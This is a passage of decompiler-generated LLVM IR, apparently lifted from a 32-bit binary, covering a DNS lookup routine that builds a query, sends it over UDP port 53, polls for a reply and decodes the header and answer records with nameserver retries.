  %v0_1000da44 = load i32, i32* @r22, align 4
  %v1_1000da44 = mul i32 %v0_1000da44, 4
  store i32 %v1_1000da44, i32* %r0.global-to-local, align 4
  %v2_1000da4c = add i32 %v1_1000da44, ptrtoint (i32* @global_var_10029868.374 to i32)
  %v3_1000da4c = inttoptr i32 %v2_1000da4c to i32*
  %v4_1000da4c = load i32, i32* %v3_1000da4c, align 4
  store i32 %v4_1000da4c, i32* @r4, align 4
  %v0_1000da50 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000da5c.375 to i32), i32* @lr, align 4
  %v4_1000da58 = inttoptr i32 %v0_1000da50 to i8*
  %v5_1000da58 = call i32 @__GI_strncat(i8* %v4_1000da58, i32 %v4_1000da4c, i32 1025, i32 ptrtoint (i32* @global_var_10029868.374 to i32))
  br label %dec_label_pc_1000da5c

dec_label_pc_1000da5c:                            ; preds = %dec_label_pc_1000da1c, %dec_label_pc_1000d9d4, %dec_label_pc_1000da2c
  store i32 %v2_1000d914, i32* @r3, align 4
  %v0_1000da64 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000da70 = load i32, i32* @r30, align 4
  %v1_1000da70 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000da70 = add i32 %v1_1000da70, %v0_1000da70
  %v1_1000da74 = sub i32 512, %v1_1000da70
  %v0_1000da7c = load i32, i32* @r21, align 4
  store i32 %v0_1000da7c, i32* %stack_var_-240, align 4
  store i32 268491400, i32* @lr, align 4
  %v4_1000da84 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_1000da70, i32 %v1_1000da74)
  store i32 %v4_1000da84, i32* @r27, align 4
  %v1_1000da88 = icmp slt i32 %v4_1000da84, 0
  br i1 %v1_1000da88, label %dec_label_pc_1000de94, label %dec_label_pc_1000da90

dec_label_pc_1000da90:                            ; preds = %dec_label_pc_1000da5c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000da98 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268491432, i32* @lr, align 4
  %v3_1000daa4 = inttoptr i32 %v0_1000da98 to i8*
  %v4_1000daa4 = call i32 @inet_pton(i32 10, i8* %v3_1000daa4, i32 %v2_1000da9c)
  %tmp59 = icmp slt i32 %v4_1000daa4, 1
  br i1 %tmp59, label %dec_label_pc_1000dab8thread-pre-split, label %dec_label_pc_1000dab0

dec_label_pc_1000dab0:                            ; preds = %dec_label_pc_1000da90
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dab8

dec_label_pc_1000dab8thread-pre-split:            ; preds = %dec_label_pc_1000da90
  %v3_1000dab8.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dab8

dec_label_pc_1000dab8:                            ; preds = %dec_label_pc_1000dab8thread-pre-split, %dec_label_pc_1000dab0
  %v3_1000dab8 = phi i16 [ %v3_1000dab8.pr, %dec_label_pc_1000dab8thread-pre-split ], [ 10, %dec_label_pc_1000dab0 ]
  %v3_1000dabc = icmp eq i16 %v3_1000dab8, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_1000dabc, label %dec_label_pc_1000dae4, label %dec_label_pc_1000dad0

dec_label_pc_1000dad0:                            ; preds = %dec_label_pc_1000dab8
  %v0_1000dad4 = load i32, i32* @r29, align 4
  store i32 268491488, i32* @lr, align 4
  %v1_1000dadc = call i32 @inet_addr(i32 %v0_1000dad4)
  %v3_1000dae4.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dae4

dec_label_pc_1000dae4:                            ; preds = %dec_label_pc_1000dab8, %dec_label_pc_1000dad0
  %v3_1000dae4 = phi i16 [ 10, %dec_label_pc_1000dab8 ], [ %v3_1000dae4.pre, %dec_label_pc_1000dad0 ]
  %v4_1000dae4 = sext i16 %v3_1000dae4 to i32
  store i32 268491508, i32* @lr, align 4
  %v3_1000daf0 = call i32 @socket(i32 %v4_1000dae4, i32 2, i32 17)
  store i32 %v3_1000daf0, i32* @r19, align 4
  %v1_1000daf4 = icmp slt i32 %v3_1000daf0, 0
  br i1 %v1_1000daf4, label %dec_label_pc_1000db20, label %dec_label_pc_1000dafc

dec_label_pc_1000dafc:                            ; preds = %dec_label_pc_1000dae4
  store i32 268491528, i32* @lr, align 4
  %v3_1000db04 = call i32 @__libc_connect(i32 %v2_1000dafc, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_1000db04, -1
  br i1 %tmp60, label %dec_label_pc_1000db28, label %dec_label_pc_1000db10

dec_label_pc_1000db10:                            ; preds = %dec_label_pc_1000dafc
  %v0_1000db10 = call i32 @__errno_location()
  %v1_1000db14 = inttoptr i32 %v0_1000db10 to i32*
  %v2_1000db14 = load i32, i32* %v1_1000db14, align 4
  store i32 %v2_1000db14, i32* %r0.global-to-local, align 4
  %v3_1000db18 = icmp eq i32 %v2_1000db14, 101
  br i1 %v3_1000db18, label %dec_label_pc_1000de60, label %dec_label_pc_1000db20

dec_label_pc_1000db20:                            ; preds = %dec_label_pc_1000db10, %dec_label_pc_1000dae4
  %v0_1000db20 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000db20 = add i32 %v0_1000db20, 1
  store i32 %v1_1000db20, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_1000db20, 3
  br i1 %tmp61, label %dec_label_pc_1000d970, label %dec_label_pc_1000de94

dec_label_pc_1000db28:                            ; preds = %dec_label_pc_1000dafc
  %v0_1000db28 = load i32, i32* @r28, align 4
  %v1_1000db28 = load i32, i32* @r27, align 4
  %v2_1000db28 = add i32 %v1_1000db28, %v0_1000db28
  %v0_1000db2c = load i32, i32* @r30, align 4
  %v0_1000db34 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_1000db3c.377 to i32), i32* @lr, align 4
  %v4_1000db38 = call i32 @__libc_send(i32 %v0_1000db34, i32 %v0_1000db2c, i32 %v2_1000db28, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000db50 = load i32, i32* @r19, align 4
  store i32 %v0_1000db50, i32* %stack_var_-248, align 4
  store i32 268491608, i32* @lr, align 4
  %v3_1000db54 = call i32 @__libc_poll(i32 %v2_1000db40, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_1000db54, 1
  br i1 %tmp62, label %dec_label_pc_1000de60, label %dec_label_pc_1000db60

dec_label_pc_1000db60:                            ; preds = %dec_label_pc_1000db28
  %v0_1000db60 = load i32, i32* @r19, align 4
  %v0_1000db64 = load i32, i32* @r30, align 4
  store i32 268491636, i32* @lr, align 4
  %v4_1000db70 = call i32 @__libc_recv(i32 %v0_1000db60, i32 %v0_1000db64, i32 512, i32 0)
  store i32 %v4_1000db70, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_1000db70, 12
  br i1 %tmp63, label %dec_label_pc_1000de08, label %dec_label_pc_1000db80

dec_label_pc_1000db80:                            ; preds = %dec_label_pc_1000db60
  %v0_1000db80 = load i32, i32* @r30, align 4
  %v2_1000db88 = inttoptr i32 %v0_1000db80 to i8*
  %v3_1000db88 = call i32 @__decode_header(i8* %v2_1000db88, i32 %v2_1000d988)
  %v3_1000db8c = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_1000db8c, i32* @r20, align 4
  %v1_1000db90 = load i32, i32* @r25, align 4
  %v4_1000db90 = icmp eq i32 %v3_1000db8c, %v1_1000db90
  br i1 %v4_1000db90, label %dec_label_pc_1000db98, label %dec_label_pc_1000de08

dec_label_pc_1000db98:                            ; preds = %dec_label_pc_1000db80
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_1000db9c, label %dec_label_pc_1000de08, label %dec_label_pc_1000dba4

dec_label_pc_1000dba4:                            ; preds = %dec_label_pc_1000db98
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1000dba8, label %dec_label_pc_1000dbb0, label %dec_label_pc_1000dc18

dec_label_pc_1000dbb0:                            ; preds = %dec_label_pc_1000dba4
  %v0_1000dbb0 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000dbb0 = icmp eq i32 %v0_1000dbb0, 0
  br i1 %v3_1000dbb0, label %dec_label_pc_1000dbb8, label %dec_label_pc_1000dc0c

dec_label_pc_1000dbb8:                            ; preds = %dec_label_pc_1000dbb0
  store i32 ptrtoint (i32* @global_var_10023498.321 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000d914, i32* %r28.global-to-local, align 4
  store i32 %v2_1000d914, i32* @r3, align 4
  %v0_1000dbd4 = call i32 @__pthread_return_void()
  %v0_1000dbdc = call i32 @__pthread_return_0()
  %v3_1000dbe4 = load i32, i32* @global_var_10023580.372, align 4
  store i32 %v2_1000d914, i32* @r3, align 4
  %v1_1000dbf0 = add i32 %v3_1000dbe4, -1
  store i32 %v1_1000dbf0, i32* %r29.global-to-local, align 4
  %v0_1000dbf4 = call i32 @__pthread_return_void()
  %v0_1000dbf8 = load i32, i32* @r22, align 4
  %v2_1000dbf8 = icmp slt i32 %v0_1000dbf8, %v1_1000dbf0
  br i1 %v2_1000dbf8, label %dec_label_pc_1000dc00, label %dec_label_pc_1000dc0c

dec_label_pc_1000dc00:                            ; preds = %dec_label_pc_1000dbb8
  %v1_1000dc00 = add i32 %v0_1000dbf8, 1
  store i32 %v1_1000dc00, i32* @r22, align 4
  %v0_1000dc04 = load i32, i32* @r20, align 4
  store i32 %v0_1000dc04, i32* @r25, align 4
  br label %dec_label_pc_1000de7cthread-pre-split.backedge

dec_label_pc_1000dc0c:                            ; preds = %dec_label_pc_1000dbb8, %dec_label_pc_1000dbb0
  %v0_1000dc0c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1000dc40

dec_label_pc_1000dc18:                            ; preds = %dec_label_pc_1000dba4
  br i1 %v3_1000dc18, label %dec_label_pc_1000dc20, label %dec_label_pc_1000de08

dec_label_pc_1000dc20:                            ; preds = %dec_label_pc_1000dc18
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1000dc38, label %dec_label_pc_1000dc2c

dec_label_pc_1000dc2c:                            ; preds = %dec_label_pc_1000dc20
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1000dc5810 = load i32, i32* @r30, align 4
  store i32 %v0_1000dc5810, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000dc48

dec_label_pc_1000dc38:                            ; preds = %dec_label_pc_1000dc20
  %v0_1000dc38 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1000dc40

dec_label_pc_1000dc40:                            ; preds = %dec_label_pc_1000dc0c, %dec_label_pc_1000dc38
  %storemerge3 = phi i32 [ %v0_1000dc38, %dec_label_pc_1000dc38 ], [ %v0_1000dc0c, %dec_label_pc_1000dc0c ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1000dc38 ], [ 1, %dec_label_pc_1000dc0c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_1000dc40 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_1000dc40, align 4
  br label %dec_label_pc_1000dea4

dec_label_pc_1000dc48:                            ; preds = %dec_label_pc_1000dc2c, %dec_label_pc_1000dc48
  %v0_1000dc5814 = phi i32 [ %v0_1000dc5810, %dec_label_pc_1000dc2c ], [ %v0_1000dc58, %dec_label_pc_1000dc48 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_1000dc2c ], [ %v2_1000dc4c, %dec_label_pc_1000dc48 ]
  store i32 268491852, i32* @lr, align 4
  %v2_1000dc48 = call i32 @__length_question(i32 %v0_1000dc5814, i32 %storemerge213)
  %v0_1000dc4c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000dc4c = add i32 %v0_1000dc4c, %v2_1000dc48
  %v0_1000dc5c.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_1000dc4c, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1000dc4c, i32* @r4, align 4
  %v0_1000dc58 = load i32, i32* @r30, align 4
  store i32 %v0_1000dc58, i32* @r3, align 4
  %v2_1000dc5c = icmp slt i32 %v0_1000dc5c.pr, 1
  %v1_1000dc60 = add i32 %v0_1000dc5c.pr, 1
  store i32 %v1_1000dc60, i32* %r29.global-to-local, align 4
  br i1 %v2_1000dc5c, label %dec_label_pc_1000dc48, label %dec_label_pc_1000dc68

dec_label_pc_1000dc68:                            ; preds = %dec_label_pc_1000dc48
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_1000dc24, label %dec_label_pc_1000ddb4, label %dec_label_pc_1000ddbc

dec_label_pc_1000dc78:                            ; preds = %dec_label_pc_1000ddb4
  store i32 %v2_1000dc78, i32* %r29.global-to-local, align 4
  %v0_1000dc7c = load i32, i32* @r30, align 4
  store i32 268491920, i32* @lr, align 4
  %v5_1000dc8c = call i32 @__decode_answer(i32 %v0_1000dc7c, i32 %v0_1000dc80, i32 %v1_1000ddb4, i32* nonnull %stack_var_-184)
  store i32 %v5_1000dc8c, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_1000dc8c, -1
  br i1 %tmp64, label %dec_label_pc_1000dcb0, label %dec_label_pc_1000dc98

dec_label_pc_1000dc98:                            ; preds = %dec_label_pc_1000dc78
  %v0_1000dc98 = load i32, i32* @r24, align 4
  %v3_1000dc98 = icmp eq i32 %v0_1000dc98, 0
  br i1 %v3_1000dc98, label %dec_label_pc_1000de08, label %dec_label_pc_1000dca0

dec_label_pc_1000dca0:                            ; preds = %dec_label_pc_1000dc98
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_1000dca4, label %dec_label_pc_1000de08, label %dec_label_pc_1000ddbc

dec_label_pc_1000dcb0:                            ; preds = %dec_label_pc_1000dc78
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_1000dcb4 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_1000dcb4, label %dec_label_pc_1000dd58, label %dec_label_pc_1000dcbc

dec_label_pc_1000dcbc:                            ; preds = %dec_label_pc_1000dcb0
  %v0_1000dcbc = load i32, i32* @r31, align 4
  store i32 %v2_1000dc78, i32* @r4, align 4
  %v1_1000dcc4 = add i32 %v0_1000dcbc, 28
  %v2_1000dcc4 = inttoptr i32 %v1_1000dcc4 to i32*
  %v3_1000dcc4 = load i32, i32* %v2_1000dcc4, align 4
  store i32 %v3_1000dcc4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000dcbc, i32* @r3, align 4
  %v1_1000dccc = add i32 %v0_1000dcbc, 36
  %v2_1000dccc = inttoptr i32 %v1_1000dccc to i32*
  %v3_1000dccc = load i32, i32* %v2_1000dccc, align 4
  store i32 %v3_1000dccc, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268492004, i32* @lr, align 4
  %v0_1000dce0 = call i32 @memcpy()
  %v0_1000dce4 = load i32, i32* @r31, align 4
  %v1_1000dce4 = add i32 %v0_1000dce4, 4
  %v2_1000dce4 = inttoptr i32 %v1_1000dce4 to i32*
  %v3_1000dce4 = load i32, i32* %v2_1000dce4, align 4
  %v3_1000dce8 = icmp eq i32 %v3_1000dce4, 24
  br i1 %v3_1000dce8, label %dec_label_pc_1000dcbc.dec_label_pc_1000dd0c_crit_edge, label %dec_label_pc_1000dcf0

dec_label_pc_1000dcbc.dec_label_pc_1000dd0c_crit_edge: ; preds = %dec_label_pc_1000dcbc
  %v1_1000dd0c.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000dd0c

dec_label_pc_1000dcf0:                            ; preds = %dec_label_pc_1000dcbc
  %v1_1000dcf0 = add i32 %v0_1000dce4, 28
  %v2_1000dcf0 = inttoptr i32 %v1_1000dcf0 to i32*
  %v3_1000dcf0 = load i32, i32* %v2_1000dcf0, align 4
  store i32 %v3_1000dcf0, i32* %r0.global-to-local, align 4
  %v3_1000dcf4 = icmp eq i32 %v3_1000dcf0, 0
  br i1 %v3_1000dcf4, label %dec_label_pc_1000ddbc, label %dec_label_pc_1000dcfc

dec_label_pc_1000dcfc:                            ; preds = %dec_label_pc_1000dcf0
  %v0_1000dcfc = load i32, i32* %r16.global-to-local, align 4
  %v3_1000dcfc = icmp eq i32 %v0_1000dcfc, 1
  br i1 %v3_1000dcfc, label %dec_label_pc_1000dd0c, label %dec_label_pc_1000dd04

dec_label_pc_1000dd04:                            ; preds = %dec_label_pc_1000dcfc
  %v3_1000dd04 = icmp eq i32 %v0_1000dcfc, 28
  br i1 %v3_1000dd04, label %dec_label_pc_1000dd0c, label %dec_label_pc_1000ddbc

dec_label_pc_1000dd0c:                            ; preds = %dec_label_pc_1000dcbc.dec_label_pc_1000dd0c_crit_edge, %dec_label_pc_1000dd04, %dec_label_pc_1000dcfc
  %v1_1000dd0c = phi i32 [ %v1_1000dd0c.pre, %dec_label_pc_1000dcbc.dec_label_pc_1000dd0c_crit_edge ], [ 28, %dec_label_pc_1000dd04 ], [ 1, %dec_label_pc_1000dcfc ]
  %v4_1000dd0c = icmp eq i32 %v3_1000dce4, %v1_1000dd0c
  br i1 %v4_1000dd0c, label %dec_label_pc_1000dd20, label %dec_label_pc_1000dd14

dec_label_pc_1000dd14:                            ; preds = %dec_label_pc_1000dd0c
  %v1_1000dd14 = inttoptr i32 %v0_1000dce4 to i32*
  %v2_1000dd14 = load i32, i32* %v1_1000dd14, align 4
  store i32 %v2_1000dd14, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000dd1c.380 to i32), i32* @lr, align 4
  %v0_1000dd18 = call i32 @free()
  br label %dec_label_pc_1000dda0

dec_label_pc_1000dd20:                            ; preds = %dec_label_pc_1000dd0c
  %v1_1000dd24 = add i32 %v0_1000dce4, 16
  %v2_1000dd24 = inttoptr i32 %v1_1000dd24 to i32*
  %v3_1000dd24 = load i32, i32* %v2_1000dd24, align 4
  store i32 %v3_1000dd24, i32* %r11.global-to-local, align 4
  %v0_1000dd28 = load i32, i32* @r24, align 4
  %v2_1000dd28 = sub i32 %tmp35, %v0_1000dd28
  %v1_1000dd2c = add i32 %v0_1000dce4, 32
  %v2_1000dd2c = inttoptr i32 %v1_1000dd2c to i32*
  %v3_1000dd2c = load i32, i32* %v2_1000dd2c, align 4
  store i32 %v3_1000dd2c, i32* %r0.global-to-local, align 4
  %v1_1000dd30 = add i32 %v2_1000dd28, -1
  %v1_1000dd34 = add i32 %v3_1000dd24, 4
  %v2_1000dd38 = mul i32 %v1_1000dd30, %v1_1000dd34
  store i32 %v2_1000dd38, i32* %r11.global-to-local, align 4
  %v2_1000dd3c = add i32 %v0_1000dce4, 36
  %v3_1000dd3c = inttoptr i32 %v2_1000dd3c to i32*
  store i32 %v1_1000dd30, i32* %v3_1000dd3c, align 4
  %v0_1000dd40 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dd40 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000dd40 = icmp ugt i32 %v0_1000dd40, %v1_1000dd40
  br i1 %v3_1000dd40, label %dec_label_pc_1000ddbc, label %dec_label_pc_1000dd48

dec_label_pc_1000dd48:                            ; preds = %dec_label_pc_1000dd20
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000dd50 = load i32, i32* @r31, align 4
  %v2_1000dd50 = add i32 %v1_1000dd50, 36
  %v3_1000dd50 = inttoptr i32 %v2_1000dd50 to i32*
  store i32 0, i32* %v3_1000dd50, align 4
  br label %dec_label_pc_1000dda0

dec_label_pc_1000dd58:                            ; preds = %dec_label_pc_1000dcb0
  %v3_1000dd58 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1000dd58, i32* @r3, align 4
  store i32 268492128, i32* @lr, align 4
  %v0_1000dd5c = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_1000dd64 = load i32, i32* %r16.global-to-local, align 4
  %v4_1000dd64 = icmp eq i32 %tmp29, %v1_1000dd64
  br i1 %v4_1000dd64, label %dec_label_pc_1000dd6c, label %dec_label_pc_1000dda0

dec_label_pc_1000dd6c:                            ; preds = %dec_label_pc_1000dd58
  %v0_1000dd6c = load i32, i32* @r31, align 4
  %v1_1000dd6c = add i32 %v0_1000dd6c, 16
  %v2_1000dd6c = inttoptr i32 %v1_1000dd6c to i32*
  %v3_1000dd6c = load i32, i32* %v2_1000dd6c, align 4
  store i32 %v3_1000dd6c, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_1000dd74 = icmp eq i32 %v3_1000dd6c, %tmp28
  br i1 %v4_1000dd74, label %dec_label_pc_1000dd7c, label %dec_label_pc_1000de00

dec_label_pc_1000dd7c:                            ; preds = %dec_label_pc_1000dd6c
  %v1_1000dd7c = add i32 %v0_1000dd6c, 36
  %v2_1000dd7c = inttoptr i32 %v1_1000dd7c to i32*
  %v3_1000dd7c = load i32, i32* %v2_1000dd7c, align 4
  %v1_1000dd80 = add i32 %v0_1000dd6c, 28
  %v2_1000dd80 = inttoptr i32 %v1_1000dd80 to i32*
  %v3_1000dd80 = load i32, i32* %v2_1000dd80, align 4
  store i32 %v3_1000dd80, i32* %r0.global-to-local, align 4
  %v2_1000dd84 = mul i32 %v3_1000dd7c, %tmp28
  %v2_1000dd8c = add i32 %v3_1000dd80, %v2_1000dd84
  store i32 %v2_1000dd8c, i32* @r3, align 4
  store i32 268492180, i32* @lr, align 4
  %v0_1000dd90 = call i32 @memcpy()
  %v0_1000dd94 = load i32, i32* @r31, align 4
  %v1_1000dd94 = add i32 %v0_1000dd94, 36
  %v2_1000dd94 = inttoptr i32 %v1_1000dd94 to i32*
  %v3_1000dd94 = load i32, i32* %v2_1000dd94, align 4
  %v1_1000dd98 = add i32 %v3_1000dd94, 1
  store i32 %v1_1000dd98, i32* %v2_1000dd94, align 4
  br label %dec_label_pc_1000dda0

dec_label_pc_1000dda0:                            ; preds = %dec_label_pc_1000dd58, %dec_label_pc_1000dd48, %dec_label_pc_1000dd14, %dec_label_pc_1000dd7c
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_1000dd7c ], [ 0, %dec_label_pc_1000dd58 ], [ 0, %dec_label_pc_1000dd48 ], [ %stack_var_-88.118, %dec_label_pc_1000dd14 ]
  %v0_1000dda0 = load i32, i32* @r28, align 4
  %v1_1000dda0 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000dda0 = add i32 %v1_1000dda0, %v0_1000dda0
  store i32 %v2_1000dda0, i32* %r28.global-to-local, align 4
  %v0_1000dda4 = load i32, i32* @r24, align 4
  %v1_1000dda4 = add i32 %v0_1000dda4, 1
  store i32 %v1_1000dda4, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_1000ddac = icmp slt i32 %v1_1000dda4, %tmp35
  br i1 %v2_1000ddac, label %dec_label_pc_1000ddb4, label %dec_label_pc_1000ddbc

dec_label_pc_1000ddb4:                            ; preds = %dec_label_pc_1000dc68, %dec_label_pc_1000dda0
  %v0_1000dc80 = phi i32 [ %v2_1000dda0, %dec_label_pc_1000dda0 ], [ %v2_1000dc4c, %dec_label_pc_1000dc68 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_1000dda0 ], [ 1, %dec_label_pc_1000dc68 ]
  %v1_1000ddb4 = load i32, i32* @r27, align 4
  %v2_1000ddb4 = icmp slt i32 %v0_1000dc80, %v1_1000ddb4
  br i1 %v2_1000ddb4, label %dec_label_pc_1000dc78, label %dec_label_pc_1000ddbc

dec_label_pc_1000ddbc:                            ; preds = %dec_label_pc_1000dca0, %dec_label_pc_1000dc68, %dec_label_pc_1000ddb4, %dec_label_pc_1000dcf0, %dec_label_pc_1000dd20, %dec_label_pc_1000dda0, %dec_label_pc_1000dd04
  %v0_1000ddbc = load i32, i32* @r19, align 4
  store i32 268492228, i32* @lr, align 4
  %v1_1000ddc0 = call i32 @__libc_close(i32 %v0_1000ddbc)
  %v3_1000ddc8 = icmp eq i32 %arg5, 0
  %v0_1000ddd8 = load i32, i32* @r30, align 4
  br i1 %v3_1000ddc8, label %dec_label_pc_1000ddd8, label %dec_label_pc_1000ddd0

dec_label_pc_1000ddd0:                            ; preds = %dec_label_pc_1000ddbc
  %v2_1000ddd0 = inttoptr i32 %arg5 to i32*
  store i32 %v0_1000ddd8, i32* %v2_1000ddd0, align 4
  br label %dec_label_pc_1000dde0

dec_label_pc_1000ddd8:                            ; preds = %dec_label_pc_1000ddbc
  store i32 %v0_1000ddd8, i32* @r3, align 4
  store i32 268492256, i32* @lr, align 4
  %v0_1000dddc = call i32 @free()
  br label %dec_label_pc_1000dde0

dec_label_pc_1000dde0:                            ; preds = %dec_label_pc_1000ddd0, %dec_label_pc_1000ddd8
  %v0_1000dde0 = load i32, i32* @r21, align 4
  store i32 %v0_1000dde0, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268492268, i32* @lr, align 4
  %v0_1000dde8 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_100297b8.368 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000dee4

dec_label_pc_1000de00:                            ; preds = %dec_label_pc_1000dd6c
  %v1_1000de00 = inttoptr i32 %v0_1000dd6c to i32*
  %v2_1000de00 = load i32, i32* %v1_1000de00, align 4
  store i32 %v2_1000de00, i32* @r3, align 4
  store i32 268492296, i32* @lr, align 4
  %v0_1000de04 = call i32 @free()
  br label %dec_label_pc_1000de08

dec_label_pc_1000de08:                            ; preds = %dec_label_pc_1000dc18, %dec_label_pc_1000db80, %dec_label_pc_1000dca0, %dec_label_pc_1000dc98, %dec_label_pc_1000db98, %dec_label_pc_1000db60, %dec_label_pc_1000de00
  %v0_1000de08 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000de08 = icmp eq i32 %v0_1000de08, 0
  br i1 %v3_1000de08, label %dec_label_pc_1000de10, label %dec_label_pc_1000de60

dec_label_pc_1000de10:                            ; preds = %dec_label_pc_1000de08
  store i32 ptrtoint (i32* @global_var_10023498.321 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000d914, i32* %r28.global-to-local, align 4
  store i32 %v2_1000d914, i32* @r3, align 4
  %v0_1000de2c = call i32 @__pthread_return_void()
  %v0_1000de34 = call i32 @__pthread_return_0()
  %v3_1000de3c = load i32, i32* @global_var_10023580.372, align 4
  store i32 %v2_1000d914, i32* @r3, align 4
  %v1_1000de48 = add i32 %v3_1000de3c, -1
  store i32 %v1_1000de48, i32* %r29.global-to-local, align 4
  %v0_1000de4c = call i32 @__pthread_return_void()
  %v0_1000de50 = load i32, i32* @r22, align 4
  %v2_1000de50 = icmp slt i32 %v0_1000de50, %v1_1000de48
  br i1 %v2_1000de50, label %dec_label_pc_1000de58, label %dec_label_pc_1000de60

dec_label_pc_1000de58:                            ; preds = %dec_label_pc_1000de10
  %v1_1000de58 = add i32 %v0_1000de50, 1
  store i32 %v1_1000de58, i32* @r22, align 4
  br label %dec_label_pc_1000de7cthread-pre-split.backedge

dec_label_pc_1000de7cthread-pre-split.backedge:   ; preds = %dec_label_pc_1000de58, %dec_label_pc_1000dc00, %dec_label_pc_1000de78
  %v0_1000de7c.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_1000de7c.pr, 3
  br i1 %tmp65, label %dec_label_pc_1000d970.lr.ph, label %dec_label_pc_1000de94

dec_label_pc_1000de60:                            ; preds = %dec_label_pc_1000db10, %dec_label_pc_1000de10, %dec_label_pc_1000de08, %dec_label_pc_1000db28
  %v0_1000de60 = load i32, i32* @r26, align 4
  %v1_1000de60 = add i32 %v0_1000de60, 1
  store i32 %v1_1000de60, i32* %r0.global-to-local, align 4
  %v1_1000de64 = load i32, i32* @r23, align 4
  %v2_1000de64 = srem i32 %v1_1000de60, %v1_1000de64
  store i32 %v2_1000de64, i32* @r26, align 4
  %v5_1000de6c = icmp eq i32 %v2_1000de64, 0
  br i1 %v5_1000de6c, label %dec_label_pc_1000de74, label %dec_label_pc_1000de78

dec_label_pc_1000de74:                            ; preds = %dec_label_pc_1000de60
  %v0_1000de74 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000de74 = add i32 %v0_1000de74, 1
  store i32 %v1_1000de74, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1000de78

dec_label_pc_1000de78:                            ; preds = %dec_label_pc_1000de60, %dec_label_pc_1000de74
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_1000de7cthread-pre-split.backedge

dec_label_pc_1000d970.lr.ph:                      ; preds = %dec_label_pc_1000d970.lr.ph.lr.ph, %dec_label_pc_1000de7cthread-pre-split.backedge
  br label %dec_label_pc_1000d970

dec_label_pc_1000de88:                            ; preds = %dec_label_pc_1000d8e8, %dec_label_pc_1000d8e0, %dec_label_pc_1000d8d8, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_1000de94

dec_label_pc_1000de94:                            ; preds = %dec_label_pc_1000de7cthread-pre-split.backedge, %dec_label_pc_1000d980, %dec_label_pc_1000da5c, %dec_label_pc_1000db20, %dec_label_pc_1000d8f4, %dec_label_pc_1000de88
  %v0_1000de94 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000de9c = inttoptr i32 %v0_1000de94 to i32*
  store i32 -1, i32* %v2_1000de9c, align 4
  %v0_1000dea0 = load i32, i32* @r25, align 4
